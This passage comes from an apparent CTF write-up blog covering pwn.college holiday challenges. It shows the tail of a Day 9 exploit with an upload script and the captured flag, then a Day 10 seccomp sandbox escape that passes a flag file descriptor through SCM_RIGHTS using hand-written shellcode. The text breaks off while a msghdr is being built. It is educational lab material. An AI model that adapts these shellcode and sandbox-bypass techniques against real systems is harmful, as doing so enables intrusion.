        <span class="n">printed_err</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">printed_err</span><span class="p">)</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[!] stderr empty</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details><p>Run:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>hacker@2025~day-09:~<span class="nv">$ </span>python3.13 printer.py
unsigned char flag_printer_pyc[] <span class="o">=</span> <span class="o">{</span>
  0xf3, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0xd3, 0x9d, 0xbc, 0x75,
  0x1a, 0x10, 0xa0, 0xf0, 0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xf3, 0x30, 0x00, 0x00, 0x00, 0x95, 0x00, 0x53, 0x00, 0x53, 0x01,
  0x4b, 0x00, 0x72, 0x00, 0x5c, 0x01, 0x22, 0x00, 0x5c, 0x00, 0x52, 0x04,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x35, 0x01, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x20, 0x00, 0x67, 0x01, 0x29, 0x02, 0xe9, 0x00, 0x00, 0x00,
  0x00, 0x4e, 0x29, 0x03, 0xda, 0x05, 0x67, 0x69, 0x66, 0x74, 0x73, 0xda,
  0x05, 0x70, 0x72, 0x69, 0x6e, 0x74, 0xda, 0x04, 0x66, 0x6c, 0x61, 0x67,
  0xa9, 0x00, 0xf3, 0x00, 0x00, 0x00, 0x00, 0xda, 0x06, 0x3c, 0x70, 0x79,
  0x70, 0x75, 0x3e, 0xda, 0x08, 0x3c, 0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65,
  0x3e, 0x72, 0x09, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x73, 0x14,
  0x00, 0x00, 0x00, 0xf0, 0x03, 0x01, 0x01, 0x01, 0xe3, 0x00, 0x0c, 0xd9,
  0x00, 0x05, 0x80, 0x65, 0x87, 0x6a, 0x81, 0x6a, 0xd5, 0x00, 0x11, 0x72,
  0x07, 0x00, 0x00, 0x00
<span class="o">}</span><span class="p">;</span>
unsigned int flag_printer_pyc_len <span class="o">=</span> 184<span class="p">;</span>

hacker@2025~day-09:~<span class="nv">$ </span>gcc <span class="nt">-o</span> exploit <span class="nt">-static</span> exploit.c
</pre></table></code></div></div><p>Because we can‚Äôt compile <code class="language-plaintext highlighter-rouge">exploit.c</code> directly on our host, I‚Äôll write script to automatically upload the binary to QEMU</p><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">base64</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"># </span><span class="sh">'</span><span class="p">)</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/home/hacker/exploit</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/run.sh</span><span class="sh">"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s"># </span><span class="sh">'</span><span class="p">)</span>

<span class="nf">run</span><span class="p">(</span><span class="sh">'</span><span class="s">cd /tmp</span><span class="sh">'</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Uploading...</span><span class="sh">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">512</span><span class="p">):</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Uploading... </span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s"> / </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">run</span><span class="p">(</span><span class="sh">'</span><span class="s">echo -n </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> &gt;&gt; b64exp</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>

<span class="nf">run</span><span class="p">(</span><span class="sh">'</span><span class="s">base64 -d b64exp &gt; exploit</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">run</span><span class="p">(</span><span class="sh">'</span><span class="s">rm b64exp</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">run</span><span class="p">(</span><span class="sh">'</span><span class="s">chmod +x exploit</span><span class="sh">'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div></details><p>Result:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>~ <span class="c"># $ ./exploit</span>
./exploit
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pypu device: /sys/bus/pci/devices/0000:00:03.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> BAR0 signature <span class="o">=</span> 0x50595055 <span class="o">(</span>expect 0x50595055<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mapped <span class="nv">BAR0</span><span class="o">=</span>0x7f88a1bdb000 <span class="nv">BAR1</span><span class="o">=</span>0x7f88a1bda000 <span class="nv">BAR2</span><span class="o">=</span>0x7f88a1bd9000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pyc length <span class="o">=</span> 184
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pyc header first 16 bytes:
f3 0d 0d 0a 00 00 00 00 d3 9d bc 75 1a 10 a0 f0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> greet_count before <span class="o">=</span> 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> greet_count after <span class="o">=</span> 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> stdout buffer:
pwn.college<span class="o">{</span>oGgSm37YdyjVckUV03nBZ6IsrGR.0FO1EjMywiN1UDN0EzW<span class="o">}</span>


<span class="o">[</span><span class="k">*</span><span class="o">]</span> stderr buffer:
<span class="o">[!]</span> stderr empty
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{oGgSm37YdyjVckUV03nBZ6IsrGR.0FO1EjMywiN1UDN0EzW}</code></p><hr /><h2 id="day10"><span class="me-2">Day10</span><a href="#day10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-9"><span class="me-2">Description</span><a href="#description-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre>TOWER ‚Üí SLEIGH:
    Tower to Sleigh, do you copy? Your position reports are no longer
    matching our tracking. Please confirm your heading.

SLEIGH ‚Üí TOWER:
    Copy, Tower. Conditions have changed. We‚Äôve lost our reference
    point in the upper air. Instruments aren‚Äôt updating. The aurora is
    shifting unpredictably, and the reindeer teams are holding, but only just.

TOWER ‚Üí SLEIGH:
    Sleigh, we show you drifting toward restricted airspace. You need
    to correct immediately. Stand by while we review the guidance
    archive.

SLEIGH ‚Üí TOWER:
    Tower, we need that reference now. Without it, we can‚Äôt plot a
    safe course forward. Everything up here looks identical‚Äîespecially
    with the aurora washing out our visual markers.

TOWER ‚Üí SLEIGH:
    Understood. Accessing the archive‚Ä¶ negative. The flag is not
    present. Without it, we cannot compute your corrective vector.

SLEIGH ‚Üí TOWER:
    Tower, control is degrading. We cannot hold this altitude much
    longer. If you have the flag, transmit it immediately‚Äîit's the
    only data that will get Santa safely through this corridor.

[static begins to rise]

TOWER:
    Sleigh, your signal is breaking. Repeat your last transmission.

[static overtakes the channel]

TOWER:
    Sleigh, do you read? Respond.

[silence]

TOWER:
    We've lost contact.

    Whoever is still listening on this frequency:
    the flag is our only means of restoring guidance.
    Recover it and return it on this channel.

    Santa‚Äôs counting on you.
</pre></table></code></div></div><hr /><h3 id="analysis-9"><span class="me-2">Analysis</span><a href="#analysis-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>northpole-relay.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;seccomp.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/seccomp.h&gt;</span><span class="cp">
</span>
<span class="cp">#define SANTA_FREQ_ADDR (void *)0x1225000
</span>
<span class="kt">int</span> <span class="nf">setup_sandbox</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"prctl(NO_NEW_PRIVS)"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">scmp_filter_ctx</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="n">SCMP_ACT_KILL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_init"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">openat</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">recvmsg</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">sendmsg</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span>
        <span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">SCMP_ACT_ALLOW</span><span class="p">,</span> <span class="n">SCMP_SYS</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">ctx</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"seccomp_load"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">seccomp_release</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"üì° Tuning to Santa's reserved frequency..."</span><span class="p">);</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">SANTA_FREQ_ADDR</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">!=</span> <span class="n">SANTA_FREQ_ADDR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"üíæ Loading incoming elf firmware packet..."</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"read"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"üßù Protecting station from South Pole elfs..."</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">setup_sandbox</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"setup_sandbox"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// puts("üéôÔ∏è Beginning uplink communication...");</span>
    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())(</span><span class="n">code</span><span class="p">))();</span>

    <span class="c1">// puts("‚ùÑÔ∏è Uplink session ended.");</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details><p>Output of <code class="language-plaintext highlighter-rouge">seccomp-tools</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre> line  CODE  JT   JF      K
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="o">=</span> <span class="nb">arch
 </span>0001: 0x15 0x00 0x08 0xc000003e  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> ARCH_X86_64<span class="o">)</span> goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> 0xffffffff<span class="o">)</span> goto 0010
 0005: 0x15 0x03 0x00 0x0000002e  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> sendmsg<span class="o">)</span> goto 0009
 0006: 0x15 0x02 0x00 0x0000002f  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> recvmsg<span class="o">)</span> goto 0009
 0007: 0x15 0x01 0x00 0x000000e7  <span class="k">if</span> <span class="o">(</span>A <span class="o">==</span> exit_group<span class="o">)</span> goto 0009
 0008: 0x15 0x00 0x01 0x00000101  <span class="k">if</span> <span class="o">(</span>A <span class="o">!=</span> openat<span class="o">)</span> goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  <span class="k">return </span>ALLOW
 0010: 0x06 0x00 0x00 0x00000000  <span class="k">return </span>KILL
</pre></table></code></div></div><p>Overall, the challenge only allow us to <code class="language-plaintext highlighter-rouge">openat</code> and <code class="language-plaintext highlighter-rouge">recvmsg</code> / <code class="language-plaintext highlighter-rouge">sendmsg</code> for socket communication. We can‚Äôt open-read-write as usual to get flag. However, we can pass the flag file descriptor (FD) to another process using UNIX domain sockets + ancillary data.</p><ul><li><code class="language-plaintext highlighter-rouge">sendmsg()</code> supports sending <code class="language-plaintext highlighter-rouge">SCM_RIGHTS</code> control messages.<li><code class="language-plaintext highlighter-rouge">SCM_RIGHTS</code> allows one process to send an open file descriptor to another.</ul><blockquote class="prompt-info"><p><a href="https://blog.cloudflare.com/know-your-scm_rights/">https://blog.cloudflare.com/know-your-scm_rights/</a></p></blockquote><p>So our plan is to:</p><ul><li><code class="language-plaintext highlighter-rouge">openat("/flag")</code> to get flag FD<li>Use <code class="language-plaintext highlighter-rouge">sendmsg()</code> with SCM_RIGHTS to send the flag FD to our own UNIX domain<li>Get the flag with that fd</ul><hr /><h3 id="exploitation-9"><span class="me-2">Exploitation</span><a href="#exploitation-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="prepare-listener-get_flagpy"><span class="me-2">Prepare listener <code class="language-plaintext highlighter-rouge">get_flag.py</code></span><a href="#prepare-listener-get_flagpy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We‚Äôll creates a local socket file (./santa_socket) and listens. When <code class="language-plaintext highlighter-rouge">recvmsg</code> receives data, we look specifically for <code class="language-plaintext highlighter-rouge">cmsg_type == socket.SCM_RIGHTS</code>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">cmsg_level</span> <span class="o">==</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span> <span class="ow">and</span> <span class="n">cmsg_type</span> <span class="o">==</span> <span class="n">socket</span><span class="p">.</span><span class="n">SCM_RIGHTS</span><span class="p">:</span>
    <span class="n">recv_fd</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">'</span><span class="s">i</span><span class="sh">'</span><span class="p">,</span> <span class="n">cmsg_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Receive FD: </span><span class="si">{</span><span class="n">recv_fd</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">break</span>
</pre></table></code></div></div><h4 id="launcher-solvepy"><span class="me-2">Launcher <code class="language-plaintext highlighter-rouge">solve.py</code></span><a href="#launcher-solvepy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1"># Connect to the unix socket created by get_flag.py
</span><span class="n">SOCKET_PATH</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./santa_socket</span><span class="sh">"</span>
<span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">SOCKET_PATH</span><span class="p">)</span>

<span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span>
    <span class="p">[</span><span class="n">BINARY_PATH</span><span class="p">],</span> 
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stdout</span><span class="o">=</span><span class="n">sock</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span> <span class="c1"># stdout is now the socket
</span>    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span>
<span class="p">)</span>
</pre></table></code></div></div><h5 id="openatat_fdcwd-flag-o_rdonly-0"><span class="me-2">openat(AT_FDCWD, ‚Äú/flag‚Äù, O_RDONLY, 0)</span><a href="#openatat_fdcwd-flag-o_rdonly-0" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-asm">    mov rax, 0x67616c662f ; "/flag"
    push rax
    mov rsi, rsp
    mov edi, -100      ; AT_FDCWD
    xor edx, edx       ; flags = 0 (O_RDONLY)
    xor r10d, r10d     ; mode = 0
    mov eax, 257       ; __NR_openat
    syscall
    mov r12, rax       ; fd
</code></pre><h5 id="sendmsgfd-msg-flags"><span class="me-2">sendmsg(fd, msg, flags)</span><a href="#sendmsgfd-msg-flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Unlike simpler syscalls like <code class="language-plaintext highlighter-rouge">read</code> or <code class="language-plaintext highlighter-rouge">write</code> (which just take a buffer and a length), we must hand-build the exact kernel ABI structs that <code class="language-plaintext highlighter-rouge">sendmsg()</code> expects: <code class="language-plaintext highlighter-rouge">struct msghdr</code>, <code class="language-plaintext highlighter-rouge">struct iovec</code>, and a control message buffer containing a <code class="language-plaintext highlighter-rouge">struct cmsghdr</code> + the FD payload for <code class="language-plaintext highlighter-rouge">SCM_RIGHTS</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">iovec</span> <span class="p">{</span>
    <span class="kt">void</span>  <span class="o">*</span><span class="n">iov_base</span><span class="p">;</span>  <span class="c1">// pointer to data</span>
    <span class="kt">size_t</span> <span class="n">iov_len</span><span class="p">;</span>   <span class="c1">// length of data</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">msghdr</span> <span class="p">{</span>
    <span class="kt">void</span>         <span class="o">*</span><span class="n">msg_name</span><span class="p">;</span>       <span class="cm">/* optional address */</span>
    <span class="n">socklen_t</span>     <span class="n">msg_namelen</span><span class="p">;</span>    <span class="cm">/* size of address */</span>
    <span class="k">struct</span> <span class="n">iovec</span> <span class="o">*</span><span class="n">msg_iov</span><span class="p">;</span>        <span class="cm">/* scatter/gather array */</span>
    <span class="kt">size_t</span>        <span class="n">msg_iovlen</span><span class="p">;</span>     <span class="cm">/* # elements in msg_iov */</span>
    <span class="kt">void</span>         <span class="o">*</span><span class="n">msg_control</span><span class="p">;</span>    <span class="cm">/* ancillary data, see below */</span>
    <span class="kt">size_t</span>        <span class="n">msg_controllen</span><span class="p">;</span> <span class="cm">/* ancillary data buffer len */</span>
    <span class="kt">int</span>           <span class="n">msg_flags</span><span class="p">;</span>      <span class="cm">/* flags on received message */</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">cmsghdr</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">cmsg_len</span><span class="p">;</span>    <span class="cm">/* Data byte count, including header
                            (type is socklen_t in POSIX) */</span>
    <span class="kt">int</span>    <span class="n">cmsg_level</span><span class="p">;</span>  <span class="cm">/* Originating protocol */</span>
    <span class="kt">int</span>    <span class="n">cmsg_type</span><span class="p">;</span>   <span class="cm">/* Protocol-specific type */</span>
    <span class="cm">/* followed by
    unsigned char cmsg_data[]; */</span>
<span class="p">};</span>
</pre></table></code></div></div><p>First, build the msghdr at the start of the stack frame</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>msghdr at [rsp+0x00]:
[rsp+0x00] (8) msg_name       = NULL
